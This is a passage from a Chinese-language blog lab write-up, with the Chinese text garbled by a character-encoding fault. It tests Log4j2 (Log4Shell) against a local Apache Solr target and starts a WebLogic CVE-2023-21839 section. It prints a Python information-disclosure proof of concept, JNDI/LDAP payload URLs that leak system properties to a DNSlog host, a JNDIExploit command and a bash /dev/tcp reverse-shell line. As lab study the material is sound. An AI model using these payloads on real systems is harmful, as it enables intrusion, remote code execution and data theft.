class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j</span></span><br><span class="line"><span class="string">&lt;=2.14 information disclosure poc &#x27;</span></span><br><span class="line">                                                 <span class="string">&#x27;(ref:</span></span><br><span class="line"><span class="string">https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on</span></span><br><span class="line"><span class="string">(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;see:</span></span><br><span class="line"><span class="string">https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span></span><br><span class="line">                             <span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br><span class="line"></span><br><span class="line">    serv_thread = threading.Thread(target=server.serve_forever)</span><br><span class="line">    serv_thread.daemon = <span class="literal">True</span></span><br><span class="line">    serv_thread.start()</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        server.shutdown()</span><br><span class="line">        server.server_close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()                </span><br></pre></td></tr></table></figure>

<h3 id="ä¿¡æ¯æ³„éœ²è„šæœ¬åˆ†æ"><a href="#ä¿¡æ¯æ³„éœ²è„šæœ¬åˆ†æ" class="headerlink" title="ä¿¡æ¯æ³„éœ²è„šæœ¬åˆ†æ"></a>ä¿¡æ¯æ³„éœ²è„šæœ¬åˆ†æ</h3><h4 id="LDAP-HEADER"><a href="#LDAP-HEADER" class="headerlink" title="LDAP_HEADER"></a>LDAP_HEADER</h4><p>å®šä¹‰ <code>LDAP_HEADER</code> å¸¸é‡ï¼Œè¿™æ˜¯å“åº” <code>LDAP</code> è¯·æ±‚æ—¶ä½¿ç”¨çš„å¤´ä¿¡æ¯</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LDAP_HEADER = <span class="string">b&#x27;\x30\x0c\x02\x01\x01\x61\x07\x0a\x01\x00\x04\x00\x04\x00\x0a&#x27;</span></span><br></pre></td></tr></table></figure>



<h4 id="ThreadedTCPRequestHandler"><a href="#ThreadedTCPRequestHandler" class="headerlink" title="ThreadedTCPRequestHandler"></a>ThreadedTCPRequestHandler</h4><p>è¿™é‡Œå®šä¹‰<code>ThreadedTCPRequestHandler</code> ç±»çš„ <code>handle()</code> æ–¹æ³•ç”¨äºå¤„ç†æ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥ã€‚</p>
<p>è¯¥æ–¹æ³•é¦–å…ˆè¾“å‡ºæ¥è‡ªå®¢æˆ·ç«¯çš„è¿æ¥ä¿¡æ¯ï¼Œç„¶åé€šè¿‡è°ƒç”¨ <code>sock.recv()</code> å’Œ <code>sock.sendall()</code> æ–¹æ³•è¯»å–å®¢æˆ·ç«¯å‘é€</p>
<p>çš„æ•°æ®ï¼Œå¹¶å‘é€å“åº”æ•°æ®</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPRequestHandler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; i| new connection from <span class="subst">&#123;self.client_address[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sock = self.request</span><br><span class="line">        sock.recv(<span class="number">1024</span>)</span><br><span class="line">        sock.sendall(LDAP_HEADER)</span><br><span class="line"></span><br><span class="line">        data = sock.recv(<span class="number">1024</span>)</span><br><span class="line">        data = data[<span class="number">9</span>:]  <span class="comment"># strip header</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># example response</span></span><br><span class="line">        <span class="comment">#</span></span><br><span class="line">        <span class="comment"># (&#x27;Java version 11.0.13\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x00\n&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;\x01\x03\x02\x01\x00\x02\x01\x00\x01\x01\x00\x0b&#x27;</span></span><br><span class="line">        <span class="comment">#  &#x27;objectClass0\x00\x1b0\x19\x04\x172.16.840.1.113730.3.4.2&#x27;)</span></span><br><span class="line"></span><br><span class="line">        data = data.decode(errors=<span class="string">&#x27;ignore&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27; v| extracted value: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h4 id="ThreadedTCPServer"><a href="#ThreadedTCPServer" class="headerlink" title="ThreadedTCPServer"></a>ThreadedTCPServer</h4><p><code>ThreadedTCPServer</code> ç±»æ˜¯ä¸€ä¸ªå¤šçº¿ç¨‹ <code>TCP</code> æœåŠ¡å™¨ï¼Œå®ƒç»§æ‰¿è‡ª <code>socketserver.ThreadingMixIn</code> å’Œ </p>
<p><code>socketserver.TCPServer</code> ç±»ã€‚è¿™æ„å‘³ç€å®ƒå¯ä»¥åŒæ—¶å¤„ç†å¤šä¸ªå®¢æˆ·ç«¯è¿æ¥ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ThreadedTCPServer</span>(socketserver.ThreadingMixIn, socketserver.TCPServer):</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>



<h4 id="main"><a href="#main" class="headerlink" title="main()"></a>main()</h4><p>main()å‡½æ•°ä½¿ç”¨æ¨¡å—è®¾ç½®å‘½ä»¤è¡Œå‚æ•°è§£æå™¨argparseï¼Œç„¶åè§£æå‘½ä»¤è¡Œå‚æ•°ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;a simple log4j&lt;=2.14 information disclosure poc &#x27;</span>                              <span class="string">&#x27;(ref:https://twitter.com/Black2Fan/status/1470281005038817284)&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>ä¸‹é¢çš„ç±»ä¼¼<code>-t,-lh,-lp</code>ç­‰ç­‰å°±æ˜¯è§£æå™¨è®¾ç½®ä¸ºæ¥å—å‘½ä»¤è¡Œå‚æ•°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    parser.add_argument(<span class="string">&#x27;--target&#x27;</span>, <span class="string">&#x27;-t&#x27;</span>, required=<span class="literal">True</span>, <span class="built_in">help</span>=<span class="string">&#x27;target uri&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-host&#x27;</span>, default=<span class="string">&#x27;0.0.0.0&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;exploit server host to listen on(default: 127.0.0.1)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--listen-port&#x27;</span>, <span class="string">&#x27;-lp&#x27;</span>, default=<span class="number">8888</span>,</span><br><span class="line"><span class="built_in">help</span>=<span class="string">&#x27;exploit server port to listen on (default: 8888)&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--exploit-host&#x27;</span>, <span class="string">&#x27;-eh&#x27;</span>, required=<span class="literal">True</span>,</span><br><span class="line">default=<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="built_in">help</span>=<span class="string">&#x27;host where (this) exploit server is reachable&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;--leak&#x27;</span>, <span class="string">&#x27;-l&#x27;</span>, default=<span class="string">&#x27;$&#123;java:version&#125;&#x27;</span>,</span><br><span class="line">                        <span class="built_in">help</span>=<span class="string">&#x27;value to leak. &#x27;</span><span class="string">&#x27;see:https://twitter.com/Rayhan0x01/status/1469571563674505217 &#x27;</span><span class="string">&#x27;(default: $&#123;java:version&#125;)&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p><code>parse_args()</code> æ–¹æ³•ç”¨äºè§£æå‘½ä»¤è¡Œå‚æ•°ï¼Œå¹¶å°†è§£æåçš„å‚æ•°å€¼å­˜å‚¨åœ¨ä¸€ä¸ªåä¸º <code>args</code> çš„å˜é‡ä¸­</p>
<p>ä¾‹å¦‚ï¼Œåœ¨æ‰§è¡Œè„šæœ¬ååŠ çš„å‘½ä»¤è¡Œå‚æ•°<code>--listen-port 8080</code>å°±è½¬å˜ä¸ºäº†<code>args.listen_port = 8080</code>ï¼Œè¿™æ ·åœ¨åç»­</p>
<p>ä»£ç è°ƒç”¨ä¸åŒå‚æ•°æ—¶ï¼Œå¯ç›´æ¥è°ƒç”¨<code>arg</code>æ¥å®ç°</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">args = parser.parse_args()</span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œå…ˆåˆ›å»ºä¸€ä¸ªåŸºäºçº¿ç¨‹çš„ <code>TCP</code> æœåŠ¡å™¨ï¼Œå¹¶ä½¿ç”¨ <code>args.listen_host</code> å’Œ <code>args.listen_port</code> æ¥æŒ‡å®šçš„ä¸»æœºå’Œç«¯</p>
<p>å£å¯åŠ¨ï¼Œå¹¶ä½¿ç”¨ <code>ThreadedTCPRequestHandler</code> ç±»æ¥å¤„ç†æ¯ä¸ªè¯·æ±‚ã€ä¹Ÿå°±æ˜¯å‰é¢æåˆ°çš„ã€‘</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| starting server on <span class="subst">&#123;args.listen_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>&#x27;</span>)</span><br><span class="line">    server = ThreadedTCPServer((args.listen_host, args.listen_port),</span><br><span class="line">ThreadedTCPRequestHandler)</span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œä¸»è¦æ˜¯å…ˆåˆ›å»ºä¸€ä¸ª <code>threading.Thread</code> å¯¹è±¡ï¼Œå¹¶å°†æœåŠ¡å™¨çš„ <code>serve_forever()</code> æ–¹æ³•ä½œä¸ºå…¶ç›®æ ‡ã€‚è¿™ä¸ªæ–¹æ³•</p>
<p>å°±æ˜¯å­—é¢æ„æ€ï¼Œå®ƒä¼šä¸€ç›´è¿è¡Œï¼Œç›´åˆ°æœåŠ¡å™¨è¢«å…³é—­ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread = threading.Thread(target=server.serve_forever)</span><br></pre></td></tr></table></figure>



<p><code>daemon</code> å±æ€§æ˜¯ <code>Python</code> ä¸­çš„çº¿ç¨‹ç‰¹æœ‰å±æ€§ï¼Œå®ƒè¡¨ç¤ºè¯¥çº¿ç¨‹æ˜¯å¦ä¸ºå®ˆæŠ¤çº¿ç¨‹ï¼Œå¦‚æœä¸€ä¸ªçº¿ç¨‹æ˜¯å®ˆæŠ¤çº¿ç¨‹ï¼Œ</p>
<p>é‚£ä¹ˆå½“ç¨‹åºé€€å‡ºæ—¶ï¼Œå®ƒä¹Ÿä¼šè¢«ä¸­æ–­ã€‚</p>
<p>è€Œè¿™é‡Œçš„è¢«è®¾ç½®ä¸º<code>ture</code>ï¼Œæ‰€ä»¥è¿™æ„å‘³ç€ç¨‹åºé€€å‡ºæ—¶ï¼Œçº¿ç¨‹å°†è¢«ä¸­æ–­ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread.daemon = <span class="literal">True</span></span><br></pre></td></tr></table></figure>



<p>ç„¶åå°±æ˜¯å¯åŠ¨çº¿ç¨‹ï¼Œå¹¶å»¶è¿Ÿ <code>1</code> ç§’é’Ÿï¼Œæ¥ç¡®ä¿æœåŠ¡å™¨å®Œå…¨å¯åŠ¨</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">serv_thread.start()</span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| server started&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;$&#123;&#123;jndi:ldap://<span class="subst">&#123;args.exploit_host&#125;</span>:<span class="subst">&#123;args.listen_port&#125;</span>/<span class="subst">&#123;args.leak&#125;</span>&#125;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27; i| sending exploit payload <span class="subst">&#123;payload&#125;</span> to <span class="subst">&#123;args.target&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>è¿™é‡Œä½¿ç”¨ <code>try-finally</code> è¯­å¥å—å‘æœåŠ¡å™¨å‘é€<code>payload</code>:</p>
<p><code>$&#123;&#123;jndi:ldap://&#123;args.exploit_host&#125;:&#123;args.listen_port&#125;/&#123;args.leak&#125;&#125;&#125;</code></p>
<p>å¹¶æ‰“å°æœåŠ¡å™¨çš„å“åº”çŠ¶æ€ç ï¼Œä»¥åŠå“åº”çš„æ–‡æœ¬å†…å®¹</p>
<p>æœ€åè°ƒç”¨æœåŠ¡å™¨çš„ <code>shutdown()</code> å’Œ <code>server_close()</code> æ–¹æ³•ï¼Œä»¥å…³é—­æœåŠ¡å™¨ï¼Œå³ä½¿åœ¨å‘é€ <code>HTTP</code> è¯·æ±‚æ—¶å‘ç”Ÿå¼‚å¸¸ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r = requests.get(args.target, headers=&#123;<span class="string">&#x27;User-Agent&#x27;</span>: payload&#125;)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response status code: <span class="subst">&#123;r.status_code&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; i| response: <span class="subst">&#123;r.text&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27; e| failed to make request: <span class="subst">&#123;e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    server.shutdown()</span><br><span class="line">    server.server_close()</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå°±æ˜¯ä¸€ä¸ªå¸¸è§çš„è¯­å¥ï¼Œå¦‚æœè„šæœ¬æ˜¯ç‹¬ç«‹æ‰§è¡Œçš„ï¼Œåˆ™ç›´æ¥å°±è°ƒç”¨ <code>main()</code> å‡½æ•°ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()    </span><br></pre></td></tr></table></figure>

<h2 id="æ¸—é€æµ‹è¯•"><a href="#æ¸—é€æµ‹è¯•" class="headerlink" title="æ¸—é€æµ‹è¯•"></a>æ¸—é€æµ‹è¯•</h2><h3 id="åˆ©ç”¨DNSlogéªŒè¯æ¼æ´"><a href="#åˆ©ç”¨DNSlogéªŒè¯æ¼æ´" class="headerlink" title="åˆ©ç”¨DNSlogéªŒè¯æ¼æ´"></a>åˆ©ç”¨DNSlogéªŒè¯æ¼æ´</h3><p>è®¿é—®<code>http://www.dnslog.cn/</code></p>
<p>å…ˆ<code>Get SubDomain</code>è·å–ä¸€ä¸ªå­åŸŸå</p>
<p><img src="/post/CVE-Test/image-20221220145121926.png" alt="image-20221220145121926"></p>
<p>ä½†æ˜¯æ—¢ç„¶æ˜¯æ³¨å…¥ï¼Œé‚£è‚¯å®šæ˜¯å­˜åœ¨å‚æ•°æ³¨å…¥ç‚¹ï¼ŒæŸ¥çœ‹å®˜æ–¹<code>solr</code>æ–‡æ¡£ï¼Œå¾—åˆ°åœ¨<code>cores</code>é‡Œ</p>
<p><img src="/post/CVE-Test/image-20221220145505204.png" alt="image-20221220145505204"></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/admin/</span>cores?action=</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>action</code>å‚æ•°å¯æ§ï¼Œæœ‰å¾ˆå¤§å¯èƒ½æ˜¯æ³¨å…¥ç‚¹</p>
<p>äºæ˜¯æŠŠæˆ‘ä»¬çš„<code>dnslog</code>è·å–çš„å­åŸŸåæŒ‰<code>payload</code>å½¢å¼æ·»åŠ åˆ°<code>url</code>åå‚æ•°ä¸­</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span>/<span class="number">4</span>d5do5.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<p>è®¿é—®æŸ¥çœ‹</p>
<p><code>DNSlog</code>æ”¶åˆ°äº†è®¿é—®è¯·æ±‚</p>
<p><img src="/post/CVE-Test/image-20221220145131607.png" alt="image-20221220145131607"></p>
<p>åŒæ—¶åœ¨é¶æœºé¡µé¢ä¸‹ä¹Ÿæœ‰<code>DNSlog</code>å­åŸŸåå›æ˜¾ï¼Œè™½ç„¶æ˜¯</p>
<p><img src="/post/CVE-Test/image-20221220145054026.png" alt="image-20221220145054026"></p>
<p>è¯´æ˜è¿™é‡Œçš„<code>$&#123;jndi:ldap://eavgk6.dnslog.cn&#125;</code>ï¼Œç¡®å®è¾¾åˆ°äº†è®¿é—®çš„ä½œç”¨</p>
<p>æ•…æ­¤æ¨æ–­<code>log4j2</code>æ¼æ´å­˜åœ¨</p>
<h3 id="ä¿¡æ¯æ³„éœ²æ¼æ´"><a href="#ä¿¡æ¯æ³„éœ²æ¼æ´" class="headerlink" title="ä¿¡æ¯æ³„éœ²æ¼æ´"></a>ä¿¡æ¯æ³„éœ²æ¼æ´</h3><p>è¿™é‡Œå¯ä»¥åˆ©ç”¨è„šæœ¬åˆ†æä¸­<code>exploitdb</code>é‡Œçš„ä¿¡æ¯æ³„éœ²è„šæœ¬å³å¯</p>
<p>æŒ‰ç…§è„šæœ¬åŸç†ä¹Ÿæ˜¯åˆ©ç”¨å ä½ç¬¦ï¼Œä¹Ÿå°±æ˜¯<code>payload</code>çš„å½¢å¼ï¼Œä½†æ˜¯å‚æ•°ä¸ºç³»ç»Ÿå±æ€§ï¼Œè¿™äº›å±æ€§ä¼šè‡ªåŠ¨è¿”å›å¯¹åº”çš„å€¼ï¼Œ</p>
<p>æœ€åè„šæœ¬é€šè¿‡å¯¹è¿”å›æ•°æ®çš„è§£æï¼Œå°±å¯ä»¥å¾—åˆ°æ•æ„Ÿæ•°æ®</p>
<p>å½“ç„¶ç›´æ¥é€šè¿‡è®¿é—®å¾—åˆ°æ¶ˆæ¯ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<p>æ¯”å¦‚<code>$&#123;sys:os.version&#125;</code>ï¼Œå°±å¾—åˆ°æˆ‘ä»¬é¶æœºçš„ç³»ç»Ÿå†…æ ¸ç‰ˆæœ¬å·ä¸º<code>5.15.0-56-generic</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span>/<span class="variable">$&#123;sys:os.version&#125;</span>.<span class="number">7</span>b09py.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20221220220840849.png" alt="image-20221220220840849"></p>
<p>å¯¹äº<code>usr.name</code>ï¼Œä»¥åŠ<code>os.name</code>ç­‰ç­‰éƒ½æ˜¯å¯ä»¥å®ç°</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span>/<span class="variable">$&#123;sys:user.name&#125;</span>.<span class="number">7</span>b09py.dnslog.cn&#125;</span><br></pre></td></tr></table></figure>



<p><img src="/post/CVE-Test/image-20221220175405653.png" alt="image-20221220175405653"></p>
<p>ä»¥ä¸‹å°±æ˜¯åœ¨<code>log4j2</code>å…¶ä»–å¯ç”¨ç³»ç»Ÿå±æ€§åˆ—è¡¨</p>
<p><img src="/post/CVE-Test/image-20221220170944260.png" alt="image-20221220170944260"></p>
<h3 id="è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h3><figure class="highlight armasm"><table><tr><td class="code"><pre><span class="line">æ”»å‡»æœºkali <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">128</span></span><br><span class="line">æ”»å‡»æœºkali ç›‘å¬ç«¯å£:<span class="number">8888</span></span><br><span class="line">é¶æœºubuntu <span class="built_in">ip</span>:<span class="number">192</span>.<span class="number">168</span>.<span class="number">80</span>.<span class="number">131</span></span><br></pre></td></tr></table></figure>

<h4 id="JNDIExploit-1-2-SNAPSHOT-jaråˆ©ç”¨JNDIæ³¨å…¥åå¼¹shell"><a href="#JNDIExploit-1-2-SNAPSHOT-jaråˆ©ç”¨JNDIæ³¨å…¥åå¼¹shell" class="headerlink" title="JNDIExploit-1.2-SNAPSHOT.jaråˆ©ç”¨JNDIæ³¨å…¥åå¼¹shell"></a>JNDIExploit-1.2-SNAPSHOT.jaråˆ©ç”¨JNDIæ³¨å…¥åå¼¹shell</h4><p>è¯¥å·¥å…·çš„åŸç†æˆ‘å‰–æäº†ä¸€ä¸‹ï¼Œ</p>
<p>å…ˆå¯åŠ¨å·¥å…·</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">java</span> -jar JNDIExploit-<span class="number">1</span>.<span class="number">2</span>-SNAPSHOT.jar -i <span class="number">192.168.80.128</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/CVE-Test/image-20221221163132059.png" alt="image-20221221163132059"></p>
<p>ç®€å•æ¥è®²å°±æ˜¯åœ¨æ”»å‡»æœºã€<code>192.168.80.128</code>ã€‘çš„<code>1389</code>ç«¯å£æ­å»ºèµ·äº†ä¸€ä¸ªæœåŠ¡å™¨ï¼Œå…¶ä¸­æ”¾ç½®äº†ä¸€ä¸ªæ¶æ„ç±»ï¼Œ</p>
<p>é€šè¿‡åˆ©ç”¨é¶æœºç½‘ç«™<code>JNDI</code>æ³¨å…¥æ¼æ´æŠŠè¿™ä¸ªæ¶æ„ç±»è¿›è¡Œè¿œç¨‹åŠ è½½ï¼Œä»è€Œæ‰§è¡Œäº†å‘½ä»¤</p>
<p>åˆ©ç”¨<code>JNDIExploit-1.2-SNAPSHOT.jar</code>æœ€å¥½çš„å°±æ˜¯ç®€åŒ–äº†<code>1.0</code>çš„ç¹æ‚å‚æ•°</p>
<p>åªéœ€è¦æ„é€ <code>payload</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">192.168</span>.<span class="number">80.131</span>:<span class="number">8983</span><span class="regexp">/solr/</span>admin<span class="regexp">/cores?action=$&#123;jndi:ldap:/</span><span class="regexp">/192.168.80.128:1389/</span>Basic<span class="regexp">/ReverseShell/</span><span class="number">192.168</span>.<span class="number">80.128</span>/<span class="number">6666</span>&#125;</span><br></pre></td></tr></table></figure>

<p><code>/Basic/ReverseShell/</code>ä¸­å…¶å®å°±åŒ…å«åå¼¹<code>shell</code>çš„å‘½ä»¤</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">bash -<span class="selector-tag">i</span> &gt;&amp; /dev/tcp/xx<span class="selector-class">.xx</span><span class="selector-class">.xx</span>.xx/xxxx <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">*è¿™é‡Œçš„</span><br><span class="line">/xx<span class="selector-class">.xx</span><span class="selector-class">.xx</span>.xx/xxxx</span><br><span class="line">å°±æ˜¯å…¶åè·Ÿä¸Šçš„å‚æ•°</span><br><span class="line">/<span class="number">192.168</span>.<span class="number">80.128</span>/<span class="number">6666</span></span><br></pre></td></tr></table></figure>

<p>äºæ˜¯å°±æ˜¯<code>/Basic/ReverseShell/192.168.80.128/6666</code>è¢«æ¶æ„ç±»åŒ…å«</p>
<p>ç„¶ååœ¨æ”»å‡»æœºç›‘å¬<code>6666</code>ç«¯å£</p>
<p><img src="/post/CVE-Test/image-20221221203418508.png" alt="image-20221221203418508"></p>
<p>æœ€åè®¿é—®<code>payload</code>ï¼Œè§¦å‘</p>
<p><img src="/post/CVE-Test/image-20221221203458628.png" alt="image-20221221203458628"></p>
<p>æˆåŠŸåå¼¹åˆ°<code>shell</code></p>
<p><img src="/post/CVE-Test/image-20221221203538282.png" alt="image-20221221203538282"></p>
<p>æµ‹è¯•å®Œæ¯•</p>
<h1 id="CVE-2023-21839-Weblogicè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"><a href="#CVE-2023-21839-Weblogicè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´" class="headerlink" title="CVE-2023-21839 Weblogicè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´"></a>CVE-2023-21839 Weblogicè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´</h1><h2 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h2><p>è¯¥æ¼æ´çš„å½±å“èŒƒå›´ä¸º<code>Weblogic 12.2.1.3.0, 12.2.1.4.0, 14.1.1.0.0</code></p>
<p>å…ˆåœ¨å®˜æ–¹çš„è¿›è¡Œä¿®å¤æ›´æ–°æ–‡æ¡£ä¸­è¿›è¡ŒæŸ¥çœ‹</p>
<blockquote>
<p><a href="https://www.oracle.com/security-alerts/cpujan2023.html">Oracle Critical Patch Update Advisory - January 2023</a></p>
</blockquote>
